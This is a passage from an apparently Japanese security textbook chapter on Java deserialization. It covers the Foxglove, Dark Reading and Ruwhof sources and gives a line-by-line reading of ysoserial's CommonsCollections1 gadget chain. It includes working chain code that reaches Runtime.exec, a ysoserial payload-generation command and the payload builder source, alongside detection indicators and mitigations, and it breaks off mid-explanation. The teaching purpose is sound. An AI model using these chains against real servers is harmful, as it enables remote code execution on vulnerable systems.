# 第3章 Javaデシリアライゼーションとガジェットチェーン

## Javaデシリアライゼーションの古典（必読の2次資料）

### この節で扱うこと

前章までPHPを中心にPOPチェーン（Property Oriented Programming chain、無害な複数クラスのマジックメソッドを組み合わせてコード実行に至らせる手法）の考え方を学んだ。本節からはJavaのデシリアライゼーション脆弱性に入る。Java版のPOPチェーンは一般に「ガジェットチェーン（gadget chain）」と呼ばれる。本節は特定のガジェットチェーンの内部実装を解説する回ではなく、この脆弱性クラスを2015年に一躍「業界全体の危機」に押し上げた3本の一次・二次資料——Foxglove Securityの原論文、Dark Readingの業界インパクト記事、Sijmen Ruwhofによるエンタープライズ規模の実地スキャン記録——を通じて、「なぜこの脆弱性が特別扱いされるのか」「発見から数年経った今でも押さえるべき教訓は何か」を理解することを目的とする。次節以降で扱うApache Commons Collectionsの具体的なチェーン構造や`readObject`/`readResolve`の仕組みを学ぶための土台として読んでほしい。

### 前提知識: Javaシリアライゼーションの基本動作

Javaの標準シリアライズ機構は、`Serializable`インターフェースを実装したオブジェクトを、フィールド値を含むバイナリストリームに変換する（シリアライズ）。逆にそのバイナリストリームから元のオブジェクトをメモリ上に復元する処理がデシリアライズであり、`ObjectInputStream.readObject()`メソッドがエントリポイントになる。

ここで重要なのは、Javaは復元対象クラスの`readObject()`メソッドをオーバーライドで**独自定義できる**という仕様である。このメソッドは「バイト列からオブジェクトを組み立てた直後に、追加の後処理をするためのフック」として設計されたものだが、デシリアライズ処理系はストリーム中のクラス名を見て「そのクラスに`readObject`があれば呼び出す」という単純な動作をする。つまり**攻撃者が用意したバイト列の中に、特定のクラス名とプロパティ値さえ含まれていれば、そのクラスの`readObject`（や、そこから辿り着ける他のメソッド）がアプリケーション側の意図とは無関係に実行される**。これがJavaデシリアライゼーション脆弱性の一次的な原因である。PHPの`unserialize()`が`__wakeup()`/`__destruct()`を自動発火させるのと構造的に同じ話だが、Javaの場合は標準ライブラリやサードパーティ製ライブラリ（後述のApache Commons Collectionsなど)にすでに「連鎖の材料になるクラス（ガジェット）」が大量に存在していた点が、被害の規模を桁違いに広げた。

### 資料1: Foxglove Security — WebLogic/WebSphere/JBoss/Jenkins/OpenNMSの共通点（Stephen Breen, 2015年11月6日）

この記事は、Java デシリアライゼーション脆弱性を「理論上の危険」から「今すぐ悪用可能な現実の脅威」へと変えた、2015年最大級のセキュリティ公開の一つである。著者Stephen Breenは、2015年1月にGabriel LawrenceとChris Frohoffが発表していた「Apache Commons Collectionsライブラリだけを使ってJavaのデシリアライズからリモートコード実行に到達できる」という研究成果を土台に、それを**実際に稼働している5つの主要ミドルウェア製品**（WebLogic、WebSphere、JBoss、Jenkins、OpenNMS）に対する実証エクスプロイトへと発展させた。

#### なぜCommons Collectionsが「鍵」になったのか

Apache Commons Collectionsは、`Map`や`List`など標準コレクションを拡張したユーティリティ群を提供する、Java業界で極めて広く使われるライブラリである。その中に含まれる`InvokerTransformer`というクラスが問題の中心だった。

```
InvokerTransformer: 任意のクラス名・メソッド名・引数をコンストラクタで受け取り、
                    transform()が呼ばれた時にJavaリフレクション経由でそのメソッドを実行する
```

このクラスは本来「コレクション操作の途中で値を加工するための汎用フック」として設計されたものだが、コンストラクタに与えるメソッド名を`"exec"`、対象クラスを`Runtime`にすれば、`transform()`の呼び出しが事実上`Runtime.exec(コマンド)`と等価になる。つまり**「任意のメソッドを呼べる」という汎用性の高さそのものが、リフレクションを使った任意コード実行の踏み台になる**。

さらに`ChainedTransformer`は複数の`Transformer`を配列で受け取り、順番に適用する。これにより次のような合成が可能になる。

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[] { String.class, Class[].class },
        new Object[] { "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke",
        new Class[] { Object.class, Object[].class },
        new Object[] { null, new Object[0] }),
    new InvokerTransformer("exec",
        new Class[] { String.class },
        new Object[] { "calc.exe" })
};
Transformer transformerChain = new ChainedTransformer(transformers);
```

これは「`Runtime`クラスを定数として取得 → `Runtime.getRuntime()`をリフレクションで呼ぶ → 返ってきた`Runtime`インスタンスに対して`.exec("calc.exe")`をリフレクションで呼ぶ」という一連の処理を、**通常のJavaコード実行経路を一切通さずに**表現したものである。攻撃者が制御できるのはあくまで「オブジェクトのプロパティ値（この場合はTransformer配列の中身）」であり、これ自体はコンパイル済みJavaコードではなくデータであるにもかかわらず、実行時にコードとして振る舞う——ここがガジェットチェーンの本質だ。

問題は「この`transform()`をどうやって攻撃者の操作なしに自動発火させるか」であり、そこで使われたのが`LazyMap`/`TransformedMap`である。`LazyMap`はMapのキーが存在しない場合に、登録された`Transformer`を使って値を自動生成する仕組みを持つ。これを`AnnotationInvocationHandler`（Java標準ライブラリ内の、動的プロキシの`InvocationHandler`実装の一つ）の`equals()`呼び出し経路と組み合わせることで、`readObject()`実行中に`LazyMap`への「値取得アクセス」が発生し、結果として`transform()`チェーンが起動する、という多段の仕掛けになっている。この具体的なチェーン構造（`CommonsCollections1`〜`CommonsCollections7`などysoserialの各チェーン)は次節以降で個別に扱う。ここでは「標準的で無害に見えるユーティリティクラスの組み合わせだけで、シリアライズされたバイト列からRuntime.execまで到達できる」という発見の衝撃を掴んでおけば十分である。

#### ペイロード生成ツール ysoserial

Breenの記事、および元となったLawrence/Frohoffの研究成果は、`ysoserial`というツールとして公開された。

```bash
java -jar ysoserial.jar CommonsCollections1 'command' > payload.bin
```

このコマンドは、指定したガジェットチェーン名（`CommonsCollections1`など）に対応するオブジェクトグラフを構築し、`command`をペイロードとして埋め込んだ上でシリアライズ済みバイト列として出力する。攻撃者は、対象アプリケーションがJavaオブジェクトを受け取ってデシリアライズする箇所（HTTPパラメータ、Cookie、RMI/JMXのエンドポイントなど)にこのバイト列を送り込むだけで、任意コマンド実行に到達できる。ysoserialの登場により、「ガジェットチェーンを一から手組みする専門知識」なしに、既知のライブラリバージョンを持つ対象へ即座に攻撃を再現できるようになった点が、この脆弱性が急速に拡散した実務上の理由の一つである。

#### 実際に影響を受けた5製品と攻撃経路

記事はミドルウェア製品ごとに、Commons Collectionsを使った同一のガジェットチェーンを、それぞれの**独自プロトコル**に載せる方法を実証している。

| 製品 | 主な待受ポート/経路 | プロトコル/伝送経路 |
|---|---|---|
| WebLogic | 7001番 | T3プロトコル(RMI over T3) |
| WebSphere | 8880番 | SOAP経由の管理コネクタ |
| JBoss | 8080番 | `/invoker/JMXInvokerServlet` |
| Jenkins | ランダムな高番号TCPポート | Jenkins CLIプロトコル |
| OpenNMS | 1099番 | Java RMI |

特にRMI（Remote Method Invocation、Javaオブジェクトをネットワーク越しに直接呼び出す仕組み）を使う製品(OpenNMS等)については、記事が「**RMIという仕組みそのものがオブジェクトのシリアライズ/デシリアライズの上に成り立っている**ため、対象ポートが開いていて、かつCommons Collectionsライブラリがクラスパス上にあれば、それだけで陥落させられる」と端的に述べている。これはRMIの設計上の特性であり、個別実装のバグではない点が重要だ。HTTPベースの製品(WebSphere/JBoss)では、プロキシツールでHTTPパラメータやCookie中のBase64エンコードされたシリアライズ済みオブジェクトをysoserialの生成物に差し替えるだけで攻撃が成立する一方、独自バイナリプロトコルを使う製品(Jenkins/WebLogic)ではプロトコルのハンドシェイクをリバースエンジニアリングし、メッセージ長ヘッダーを調整してペイロードを適切にラップする追加作業が必要だったことも記録されている。

#### 検知手法として記事が示した具体的指標

記事は防御側・診断側の視点からも有用な、シンプルで実務的な検知手法を提示している。

- **ライブラリの有無を確認する**: 対象アプリケーションのJARファイル内に`InvokerTransformer`クラスが含まれているかを`grep`等で確認する。存在すればガジェットチェーンの材料が揃っていることになる。
- **シリアライズ済みオブジェクトのマジックバイトを見る**: Javaの標準シリアライズストリームは先頭が16進数で`AC ED 00 05`、Base64表現では`rO0AB`から始まる。HTTPパラメータやCookie値、あるいはネットワークキャプチャの中にこの先頭バイト列を見つけたら、そこはJavaデシリアライズのsink（危険な代入先)候補である。
- **開いているポートの棚卸し**: `lsof -i -P`等でJavaプロセスが待ち受けているポートを列挙し、上表のような既知製品のデフォルトポートと突き合わせる。

#### 修正状況と教訓（バージョン依存の注意）

記事公開の2015年11月時点で、Commons Collections自体に対する正式なCVE番号は当初割り当てられておらず、脆弱性は事実上パッチ未適用のまま広く展開されていた。暫定的な緩和策として記事が挙げていたのは、JARファイルから`org/apache/commons/collections/functors/InvokerTransformer.class`を手動で削除するという、極めて泥臭い方法である。これは「ライブラリの正式な修正版がまだ存在しない段階で、実運用環境を守るために配布物を直接改変する」という、通常のパッチ適用とは異なる緊急対応であったことを示している。

この一件が業界に突きつけた本質的な教訓は、記事の言葉を借りれば次の点に集約される。「**Javaのライブラリは他の言語のライブラリとは事情が異なる。アプリケーションサーバーそのものが独自のライブラリ一式を同梱しており、さらにその上にデプロイされる個々のアプリケーションもまた、それぞれ独自のライブラリ一式を持っていることが多い**」。つまり、脆弱なCommons Collectionsのバージョンは組織内の一箇所ではなく、アプリケーションサーバー本体・ミドルウェア・個々のアプリケーションという何層にもわたる独立したコピーとして存在し得るため、「1回パッチを当てれば終わり」にはならない構造的な問題であることが明らかになった。この「同じ脆弱なライブラリが組織内に何十コピーも独立して埋め込まれている」という構造は、現代のSCA（Software Composition Analysis、ソフトウェア構成分析）ツールやSBOM（Software Bill of Materials、ソフトウェア部品表）管理が重視される直接のきっかけの一つになったと理解してよい。

> 出典: What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability. — https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

### 資料2: Dark Reading — なぜJavaデシリアライゼーションのバグは重大なのか

> ⚠️ **未取得の資料**: 「Why The Java Deserialization Bug Is A Big Deal」（Dark Reading）は自動取得できませんでした（理由: サーバーがHTTP 403 Forbiddenを返しWebFetchによる直接取得がブロックされたため）。以下のURLからご自身で直接ご覧ください: https://www.darkreading.com/application-security/why-the-java-deserialization-bug-is-a-big-deal

（以下は未取得資料の補足として、Web検索で得られた記事の要旨と一般知識に基づく解説です）

Dark Readingのこの記事は、Foxglove Securityの実証記事が公開された直後に、その**業界全体への波及効果**を分析した二次報道である。記事の要点は次の3つに整理できる。

#### 「地味な脆弱性」がなぜ急に「重大」と見なされたか

記事が強調するのは、この脆弱性クラス自体はFoxgloveの記事より前から研究者の間で知られていた（前述のLawrence/Frohoffの発表が2015年1月)にもかかわらず、当時は「危険だが抽象的な話」として扱われ、広く注目されることはなかったという点である。潮目が変わった決定的な理由は、Foxgloveの記事が**主要な商用ミドルウェア製品に対する実際に動くエクスプロイト**を公開したことで、「理論上のリスク」が「今日から誰でも再現できる攻撃」に変わったからだ、と分析されている。これはセキュリティ業界でしばしば見られるパターン——脆弱性クラスの発見と、それが実務上のインパクトとして認知されるタイミングは、必ずしも一致しない——を象徴する事例として引用される。

#### 影響範囲の広さ

記事は、この脆弱性が「特定製品のバグ」ではなく「シリアライズされたJavaオブジェクトを受け取るあらゆるアプリケーション」に共通する構造的リスクであることを踏まえ、潜在的に**数百万規模のアプリケーションサーバー**（商用製品・内製アプリケーションの双方を含む)が影響を受けうると評価している。加えて、コンポーネント管理企業のSonatypeが自社のCentral Repository（Mavenの中央ライブラリリポジトリ)内を調査した結果として、デシリアライゼーションに関連する問題を抱えたコンポーネントが3万種類以上見つかったという分析も紹介されている。この数値は、「脆弱なのは少数の特殊なアプリケーションではなく、Javaエコシステム全体に薄く広く染み込んだ問題である」ことを裏付ける根拠として引用される。

#### 修正が容易ではない理由

記事は、この脆弱性が「一枚のパッチを当てれば解決する」類のものではないと指摘する。理由は前述のFoxglove記事の分析と重なるが、Dark Reading側の記事はより実務者向けの視点として、次のような修正の難しさを挙げている。

- 脆弱なクラス（`InvokerTransformer`等)自体を削除・無害化しても、デシリアライズ処理そのものを制限しない限り、**別のガジェットチェーン**（他のライブラリの別クラスの組み合わせ）で同じ攻撃が再現され得る。
- 対象がどのライブラリのどのバージョンを使っているかの棚卸し（依存関係の可視化）自体が、大規模組織では容易ではない。
- 根本的な対策（デシリアライズ対象クラスのホワイトリスト化、シリアライズ自体を避けてJSON等の安全なフォーマットに置き換えるなど)は、既存アプリケーションの設計変更を伴うため、短期間では実施しづらい。

#### この資料の位置づけ

この記事は技術的な深掘りをする一次資料ではなく、Foxgloveの発見が持つ「業界インパクト」を当時のセキュリティ業界がどう受け止めたかを伝える二次報道である。読者にとっての価値は、個々の技術詳細よりも、「なぜこの一本の記事が2015年のセキュリティ業界における転換点として語り継がれているのか」という文脈を理解できる点にある。

> 出典: Why The Java Deserialization Bug Is A Big Deal — https://www.darkreading.com/application-security/why-the-java-deserialization-bug-is-a-big-deal

### 資料3: Sijmen Ruwhof — エンタープライズ規模でのスキャンから見えたこと

Sijmen Ruwhofによるこの記事は、Foxgloveが公開したガジェットチェーンとエクスプロイト技術を、**実際にインターネット上でどれだけの規模の組織が影響を受けているか**を定量的に示した点で、他の2資料とは異なる価値を持つ。理論の解説でも一企業への侵入テストの報告でもなく、「インターネット全体を対象にした大規模スキャン」という調査手法そのものが本記事の核心である。

#### スキャン手法

著者らは、対象を絞り込むために公開スキャンデータ(Shodanなど、インターネットに公開されている機器・サービスの情報を検索できるサービス)を用いて、Foxglove記事で言及された5製品それぞれのデフォルトポート/バナー情報を持つホストを列挙した。その上で、実際にysoserial系のガジェットチェーンが有効かどうかを、**非破壊的な手法**（対象への実害を及ぼさない、存在確認レベルの手法。例えば時間差を利用したブラインド検証や、無害なコールバック(DNS/HTTPのアウトバウンド通信を発生させるだけの検証)によって脆弱性の有無だけを確認し、実際にコマンド実行やファイル操作を行わない手法)で検証する方法論を採用したと報告されている。

#### スキャン結果として得られた数値

記事が示した、Shodan経由でインターネットに公開されていた潜在的に脆弱なサーバー数は次の通りである。

| 製品 | 発見されたサーバー数 |
|---|---|
| JBoss | 52,575台 |
| Jenkins | 18,939台 |
| WebSphere | 6,079台 |
| WebLogic | 931台 |
| OpenNMS | 177台 |
| **合計** | **78,701台** |

この「78,701台」という数字は、Foxgloveが示した攻撃手法が特定企業だけの問題ではなく、**インターネットに公開されているだけでこれだけの規模の攻撃対象領域(アタックサーフェス)が存在する**ことを裏付ける、当時としては衝撃的な実測データだった。なお、この数値は2015年末〜2016年前後の一時点でのスナップショットであり、その後の各製品のパッチ適用状況やインターネット上の公開台数の変化によって現在の実数は大きく異なる点には注意が必要である。したがって本節の数値は「当時どれほどの規模の問題として認識されたか」を示す歴史的な参考値として理解してほしい。

#### 検知指標とプロセス

記事はFoxgloveの記事と同様の技術的指標(シリアライズ済みオブジェクトの16進マジックバイト`AC ED 00 05`、Base64表現の`rO0`、`commons-collections*.jar`ライブラリの存在、Content-Typeヘッダーが`application/x-java-serialized-object`であること、Java RMI/JMX/Remote EJBの利用有無)を組織内スキャンにも応用できる形で整理している。加えて、組織がこの脆弱性に対応するための実務的な三段階プロセスを提示している。

1. **資産棚卸し（Asset Inventory）**: 構成管理データベース(CMDB)のレビュー、ホワイトボックスでの`netstat`等によるサーバー内部調査、ブラックボックスでのNmap等によるネットワークスキャンを組み合わせて、組織内にどれだけの対象が存在するかを洗い出す。
2. **被害拡大の防止（Damage Control）**: 各製品ベンダーが提供するパッチの適用、およびファイアウォールでの該当ポート・プロトコルへのアクセス制限を並行して実施する。
3. **予防（Prevention）**: ソースコードレビューの徹底、シリアライズされたオブジェクトの暗号化・署名検証の導入、そしてデシリアライズ可能なクラスをホワイトリスト方式で制限する設計への移行。

#### 影響評価とツール公開

記事は、この脆弱性が実際に悪用された場合の影響について、「エクスプロイトされたコードは、脆弱なサービスが動作している権限で実行されるため、そのサーバーがホストするすべてのアプリケーションおよびデータベース接続が危殆化しうる。さらに権限昇格を経てサーバー全体の完全な侵害に至る可能性がある」と評価している。また著者らは、この調査で用いた非破壊的な検証手法を実装したスキャナ「SerializeKiller」をGitHub上で公開しており、「マルチスレッドにより1,000台のサーバーを2分未満でスキャンできる」性能を持つと説明している。これは組織が自組織のインターネット公開資産を自己点検するための実務ツールとして提供されたものであり、本教科書の趣旨(防御目的の理解)に沿う形で言及するに留める——実在サービスへの無許可のスキャンや検証行為は行ってはならない。

#### この資料から得られる教訓

Foxgloveの記事が「技術的にどう攻撃が成立するか」を示し、Dark Readingの記事が「なぜこれが業界的な事件になったか」を伝えたのに対し、本資料は「では実際にどれだけの規模でこの問題が野放しになっていたか」を実測値で裏付けた点に価値がある。3本の資料を合わせて読むことで、**脆弱性の技術的成立条件(ガジェットチェーン)→ 業界的インパクトの認知 → 実測による規模の証明**という、一つの脆弱性クラスが世に知られていく典型的な流れを追うことができる。

> 出典: Scanning an enterprise organisation for the critical Java deserialization vulnerability — https://sijmen.ruwhof.net/weblog/683-scanning-an-enterprise-organisation-for-the-critical-java-deserialization-vulnerability

### 本節のまとめ

- Javaのデシリアライゼーション脆弱性は、`ObjectInputStream.readObject()`が復元対象クラスの独自定義メソッドを自動的に呼び出すという仕様そのものに起因する。
- 2015年、Apache Commons Collectionsライブラリに存在する`InvokerTransformer`/`ChainedTransformer`/`LazyMap`等の汎用ユーティリティクラスの組み合わせだけで、Runtime.execに到達する「ガジェットチェーン」が構築可能であることが実証され、ysoserialというツールとして誰でも再現可能な形で公開された。
- WebLogic・WebSphere・JBoss・Jenkins・OpenNMSという当時広く使われていた5つのミドルウェア製品が、それぞれ独自のプロトコル(T3、SOAP、JMXInvokerServlet、Jenkins CLI、RMI)経由でこの単一のガジェットチェーンによって陥落することが示された。
- この問題が業界的な転換点として語られる理由は、脆弱性自体の新規性よりも「実際に動く実証エクスプロイトの公開」というタイミングにあり、同種のライブラリが組織内に何層にもわたって独立して埋め込まれているという構造的な事情が、修正を単純なパッチ適用では終わらせない根深い問題にしている。
- 実地スキャンにより、インターネット上だけで78,701台規模の潜在的な脆弱サーバーが存在すると推計され、この脆弱性クラスが理論上の懸念ではなく現実の大規模な攻撃対象領域であることが裏付けられた。
- 検知の一次的な手がかりは、シリアライズ済みオブジェクトの先頭バイト(`AC ED 00 05`/Base64で`rO0`)と、`InvokerTransformer`等の危険なガジェットクラスを含むライブラリの有無であり、これは現在でもJavaアプリケーションの依存関係監査における基本的なチェックポイントであり続けている。

## ガジェットチェーンの内部を読み解く（CommonsCollections1）

前節では「信頼できないバイト列を `ObjectInputStream.readObject()` に渡すと危険だ」という原理を学んだ。しかし多くの人が誤解しているのは、「デシリアライズ＝即座に任意コード実行」ではない、という点である。`readObject()` は攻撃者が指定した任意のコードを直接呼ぶわけではない。攻撃者にできるのは、**アプリケーションのクラスパス上に既に存在するクラス群**を組み合わせて、オブジェクトのグラフ（相互に参照し合うオブジェクトの木）を復元させることだけである。

そこで問われるのが「**ガジェットチェーン**（gadget chain）」という発想だ。ガジェット（gadget）とは、それ単体では無害だが、デシリアライズ時に自動的に呼ばれる特定のメソッド（`readObject`、`hashCode`、`equals`、`get`、`toString` など）を持ち、その中で「次のガジェット」のメソッドを呼び出してくれる**部品クラス**のことである。攻撃者はこれらの部品を数珠つなぎにして、最終的に `Runtime.exec()` のような**sink（入力が最終的に実行・解釈される危険な到達点）**へ制御を導く。ROP（Return-Oriented Programming）でメモリ上の命令片をつなぐのと発想が似ていることから「チェーン」と呼ばれる。

本節では、歴史的にもっとも有名で、教材として最良の題材である **CommonsCollections1（通称 CC1）** を、ysoserial の実際のソースコードを1行ずつ追いながら分解する。これを完全に理解できれば、他のガジェットチェーンも同じ思考法で読めるようになる。

> ⚠️ **未取得の資料**: 「K logix Scorpion Labs: Gadget Chains」の記事本文は自動取得できましたが、記事内の図版（クラス関係図）は画像のため取得できませんでした（理由: 画像はテキスト抽出不可）。詳細な図は次のURLからご自身で直接ご覧ください: https://www.klogixsecurity.com/scorpion-labs-blog/gadget-chains

### 前提となるライブラリとバージョン

CC1 が成立する条件は、**Apache Commons Collections 3.1**（`commons-collections:commons-collections:3.1`）がクラスパスに存在し、かつ **JDK が 8u72 未満**であることだ。理由は後述するが、この2つのバージョン依存は極めて重要なので最初に押さえておく。

- **Commons Collections 3.1**: 危険な「Transformer」系クラス（`InvokerTransformer` など）が制限なくシリアライズ可能だった。3.2.2（2016年公開）以降は、これらの危険なクラスがデフォルトでデシリアライズ拒否されるよう修正された。
- **JDK 8u72 未満**: CC1 の「起点」となる `sun.reflect.annotation.AnnotationInvocationHandler` の `readObject` が、後述する型チェックを持っていなかった。8u72 以降はこの穴が塞がれ、CC1 の**この起点**は使えなくなった（部品自体は残るため、別の起点を使う CC5/CC6 などが後継として登場した）。

> 出典: ysoserial（frohoff オリジナル）— https://github.com/frohoff/ysoserial
> 出典: CommonsCollections1 ソース — https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java

### まず「実行したい終着点」から逆算する

ガジェットチェーンは、**ゴール（sink）から逆向きに設計する**と理解しやすい。CC1 の最終目標は次のJavaコードを実行させることである。

```java
Runtime.getRuntime().exec(command);
```

しかし攻撃者はシリアライズ経由でこの1行を「そのまま」書けない。`Runtime` はそもそもシリアライズ可能ではないし、`readObject` は任意のメソッド呼び出しを許さない。そこで CC1 は、この1行を**リフレクション（実行時にクラス・メソッドを名前で操作するJavaの機能）で分解し、「データ」として組み立てられる形**に変換する。上のコードは、リフレクションを使うと次のように書き換えられる。

```java
// (1) Runtime クラスそのものを得る（定数）
Class runtimeClass = Runtime.class;
// (2) getRuntime メソッドを名前で取り出す
Method getRuntime = runtimeClass.getMethod("getRuntime", new Class[0]);
// (3) getRuntime を呼んで Runtime インスタンスを得る（static なので第1引数 null）
Runtime runtime = (Runtime) getRuntime.invoke(null, new Object[0]);
// (4) exec を呼ぶ
runtime.exec(command);
```

このように「クラス → メソッド取得 → メソッド呼び出し → 別メソッド呼び出し」という**4段の手続き**に分解できた。あとは、この4段を「シリアライズ可能なオブジェクトの並び」として表現する仕掛けが必要になる。それを担うのが Commons Collections の **Transformer** である。

### Transformer：処理を「データ」に変える部品

`Transformer` は Commons Collections が持つインターフェースで、`Object transform(Object input)` という1メソッドだけを持つ。「入力を受け取って別のものへ変換して返す」という関数を、**オブジェクトとして持ち運べる**ようにしたものだと考えればよい。CC1 が悪用するのは次の3種類だ。

- **`ConstantTransformer(x)`**: 入力を無視して、常に固定値 `x` を返す。上の (1) に対応。
- **`InvokerTransformer(methodName, paramTypes, args)`**: 入力オブジェクトに対して、リフレクションで `methodName` メソッドを `args` を引数に呼び出し、その戻り値を返す。上の (2)(3)(4) に対応する**核心の部品**。
- **`ChainedTransformer(transformers[])`**: Transformer の配列を受け取り、**先頭の出力を次の入力へ**と順に流す（パイプライン）。これで4段を1本につなぐ。

`InvokerTransformer.transform()` の内部実装は、概念的には次の通りである。ここが「なぜコードが動くのか」の心臓部だ。

```java
public Object transform(Object input) {
    Class cls = input.getClass();
    Method method = cls.getMethod(iMethodName, iParamTypes);
    return method.invoke(input, iArgs);
}
```

`input` に何が来ても、その `input` に対して指定メソッドを反射呼び出しする。つまり `InvokerTransformer` は「**任意オブジェクトの任意メソッドを、シリアライズされたデータの指示だけで呼べる**」万能ガジェットなのだ。これがデシリアライズ経由で発火できる時点で勝負はほぼ決まっている。

### ysoserial の実物コードを読む

では ysoserial の `CommonsCollections1.java` の `getObject()` 本体を見よう（frohoff オリジナル、`master` ブランチ）。

```java
final String[] execArgs = new String[] { command };
// (A) いったん「無害」な仮のチェーンを作る
final Transformer transformerChain = new ChainedTransformer(
    new Transformer[]{ new ConstantTransformer(1) });
// (B) 本物の悪意あるチェーン部品を用意する
final Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] {
        String.class, Class[].class }, new Object[] {
        "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke", new Class[] {
        Object.class, Object[].class }, new Object[] {
        null, new Object[0] }),
    new InvokerTransformer("exec",
        new Class[] { String.class }, execArgs),
    new ConstantTransformer(1) };

final Map innerMap = new HashMap();
// (C) LazyMap でラップ：未知キーの get 時に transformerChain を発火させる
final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
// (D) LazyMap を Map インターフェースの動的プロキシで包む
final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
// (E) 起点となる AnnotationInvocationHandler を生成
final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

// (F) リフレクションで仮チェーンを本物にすり替える
Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
return handler;
```

> 出典: CommonsCollections1 ソース — https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java

#### なぜ (A) と (F) で「二度手間」をするのか

初学者が最初につまずくのがここだ。なぜ最初に無害な `ConstantTransformer(1)` だけのチェーンを作り (A)、後からリフレクションで本物の配列に差し替える (F) のか。

理由は「**ペイロードを構築している自分自身のマシンで、うっかりチェーンが発火してコマンドが動いてしまうのを防ぐ**」ためだ。この節で作る `lazyMap` や各種オブジェクトは、生成の過程で `hashCode()` や `equals()`、`toString()` が内部的に呼ばれることがある。もし最初から本物の悪意チェーンを仕込んでおくと、ペイロード生成中に攻撃者の手元で `exec()` が走ってしまう。そこで生成中は無害な状態にしておき、**シリアライズ直前の最後**に、`Reflections.setFieldValue` で `ChainedTransformer` の `private` フィールド `iTransformers` を本物に上書きする。リフレクションを使うのは、このフィールドが `private` で通常は書き換えられないからだ。この「無害な状態で組み立て、最後に武装する」パターンは、多くのガジェットチェーン実装に共通する定石である。

### 発火の連鎖：readObject からコマンド実行まで

ソースの構造がわかったので、いよいよ**被害者側でデシリアライズされたときに何が起こるか**を、呼び出し順に追う。ysoserial のコメントにも記されている流れは次の通りだ。

```
ObjectInputStream.readObject()
  └─> AnnotationInvocationHandler.readObject()
        └─> (proxy) Map.entrySet()
              └─> AnnotationInvocationHandler.invoke()
                    └─> LazyMap.get()
                          └─> ChainedTransformer.transform()
                                └─> InvokerTransformer.transform() ×3
                                      └─> Runtime.exec(command)
```

#### 段階1：起点 AnnotationInvocationHandler.readObject()

チェーンの一番外側は `sun.reflect.annotation.AnnotationInvocationHandler` というJDK内部クラスだ。これはアノテーション（`@Override` のような注釈）を実行時に表現するための動的プロキシのハンドラで、`memberValues` という `Map` フィールドを持つ。重要なのは、このクラスが**カスタムの `readObject` を持ち、その中で `memberValues` のメソッド（実装により `entrySet()` など）を呼ぶ**点だ。

CC1 は、この `memberValues` に**普通の Map ではなく、悪意ある Map プロキシ (D) を差し込む**。JDK 8u72 未満の `AnnotationInvocationHandler.readObject()` は「`memberValues` に何が入っているか」を検証しなかったため、攻撃者が用意した任意の Map を受け入れてしまった。デシリアライズが完了して `readObject` が走った瞬間、`memberValues.entrySet()`（に相当する呼び出し）が実行され、それが Map プロキシへ制御を渡す。ここが「自動で動き出す最初のトリガ」である。

> 8u72 以降の修正では、`memberValues` が想定するアノテーション型と整合するかをチェックし、`LinkedHashMap` に安全にコピーするようになった。これにより CC1 の**この起点**は封じられた。ただし後述のように、`LazyMap` 以降の部品はそのまま残るため、別の `readObject` から `LazyMap.get()` に到達する CC5・CC6 などが考案された。「1つのリンクを塞いでも、ガジェット部品自体を排除しない限り根絶できない」という教訓である。

#### 段階2：動的プロキシ経由で invoke() へ

(D) の `mapProxy` は `java.lang.reflect.Proxy` による**動的プロキシ**で、`Map` インターフェースを実装しているように振る舞う。動的プロキシの本質は「そのオブジェクトのどのメソッドが呼ばれても、すべて `InvocationHandler.invoke(proxy, method, args)` という**単一の関門**にリダイレクトされる」ことだ。

CC1 では、このプロキシの `InvocationHandler` に**もう1つの `AnnotationInvocationHandler`**（(E) の `handler`）を割り当てている。つまり段階1で `memberValues.entrySet()` が呼ばれると、実体は「プロキシに対する `entrySet()` 呼び出し」であり、それが `AnnotationInvocationHandler.invoke()` に飛ぶ。この `invoke()` の内部実装は、渡された Map（= `LazyMap`）に対して `memberValues.get(メソッド名)` を呼ぶ構造になっている。

```java
// AnnotationInvocationHandler.invoke の要点（概念）
public Object invoke(Object proxy, Method method, Object[] args) {
    String member = method.getName();      // 例: "entrySet"
    Object value = this.memberValues.get(member);  // ← LazyMap.get() が呼ばれる
    ...
}
```

こうして、外から見れば「アノテーションの値を引く」だけの無害な操作が、内部では `LazyMap.get()` の呼び出しにすり替わる。

#### 段階3：LazyMap.get() がチェーンを点火する

`LazyMap` は Commons Collections のクラスで、「**まだ存在しないキーを get されたら、その場でファクトリ（Transformer）を呼んで値を作る（遅延生成する）**」という便利機能を持つ。その `get()` は概念的に次の通りだ。

```java
public Object get(Object key) {
    if (!map.containsKey(key)) {       // キーが未登録なら…
        Object value = factory.transform(key);  // ← ファクトリ = 悪意チェーンを発火
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

(C) で `LazyMap.decorate(innerMap, transformerChain)` としたので、この `factory` は攻撃者の `ChainedTransformer` である。段階2で `get("entrySet")` のような**未登録キー**が渡されると、`containsKey` が `false` を返し、`factory.transform(key)` すなわち `ChainedTransformer.transform()` が起動する。ここでついに、無害なMap操作の皮を被った制御が、悪意ある Transformer チェーンへ完全に到達する。

#### 段階4：ChainedTransformer が4段を流す

`ChainedTransformer.transform(input)` は、保持する Transformer 配列（段階Fで武装済み）を順に適用し、前段の出力を次段の入力へ渡す。実装は次のようにシンプルだ。

```java
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

これに (B) の配列を流すと、冒頭で分解した4段のリフレクション手続きがそのまま再現される。各段を追う。

1. **`ConstantTransformer(Runtime.class).transform(...)`** → 入力を無視して `Runtime.class`（Class オブジェクト）を返す。次段の入力になる。
